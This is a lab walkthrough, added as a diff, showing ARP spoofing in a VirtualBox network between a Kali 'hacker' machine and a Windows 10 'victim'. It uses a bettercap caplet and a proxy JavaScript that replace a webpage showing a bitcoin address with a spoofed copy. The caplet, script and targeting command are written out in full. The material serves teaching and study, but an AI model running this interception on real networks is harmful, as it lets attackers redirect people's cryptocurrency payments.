@@ -1,0 +1,87 @@
+Spoofing a visible public bitcoin address on a webpage.
+
+====================================================================================
+SETUP: (Kali and Win10 in Virtualbox)
+=====================================================================================
+On VirtualBox VM there is a Kali Linux instance (HACKER) and a Windows 10 instance (VICTIM) using the same NAT (Network Address Translation) network.
+
+Check if default gateway is same for both computers. This indicates that computers are on same network.
+WIN10 and KALI:
+arp -a
+
+Note the IPs of the VICTIM (client) and HACKER (server):
+WIN10:
+ipconfig
+KALI:
+ifconfig
+
+====================================================================================
+SETUP AND RUN CORRECTLY:
+=====================================================================================
+
+SERVER: (Kali Linux hacker, but it can be any server in this network in this demo. )
+[!!Q - how to run Java HTTP server on Kali Linux]
+Run the server on KALI:
+The HTML page (index.html) is found on the Kali apache server at /var/www/html and is the correct requested URL and content as expected by the victim.
+service apache2 start
+
+CLIENT: (Windows 10 victim)
+Load the served webpage in Chrome browser:
+Type the server IP ie 10.0.2.15 (Kali Linux IP without port, this is the apache server)
+
+====================================================================================
+PRE-ATTACK (setup bettercap http proxy scripts and spoofed version of HTML file):
+=====================================================================================
+Copy and manipulate two tiny files:
+-
+Kali: in (/) computer-->usr-->share->bettercap-->caplets-->web-override 
+[[https://github.com/bettercap/caplets/tree/master/web-override]]
+-
+Copy the two files in this folder to the Kali (home) folder: so that the command line can read them.
+vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
+Content of the two files:
+1 - [the CAP file is a few bettercap lines of instructions which also call the JS file:]
+#
+set http.proxy.script web-override.js
+http.proxy on
+arp.spoof.on
+events.clear
+#
+2 - [the JS file calls an html WITH SPOOFED BTC ADDRESS AS PAYLOAD in KALI at /usr/local/share/bettercap/caplets/www/index.html:]
+//
+function onRequest(req, res) {
+    headers = res.Headers.split("\r\n");
+    for (var i = 0; i < headers.length; i++) {
+        header_name = headers[i].replace(/:.*/, "");
+        res.RemoveHeader(header_name);
+    }
+    res.SetHeader("Connection", "close");
+    res.Status      = 200;
+    res.ContentType = "text/html";
+    res.Body        =  readFile("/usr/local/share/bettercap/caplets/www/index.html");
+}
+//
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+====================================================================================
+PRE-ATTACK (run packet sniffing)
+=====================================================================================
+
+Run a packet sniffer and set it to sniff at eth0:
+wireshark
+
+====================================================================================
+ATTACK:
+=====================================================================================
+
+run the bettercap show and it will start intercepting almost instantly, stop after it is shown the client loaded the website.
+bettercap -caplet web-override.cap -eval "set arp.spoof.targets 10.0.2.6" <--IP of VICTIM IP on same network.
+
+====================================================================================
+STOP ATTACK:
+=====================================================================================
+
+type 'quit' in bettercap console.
+stop wireshark.
+
+
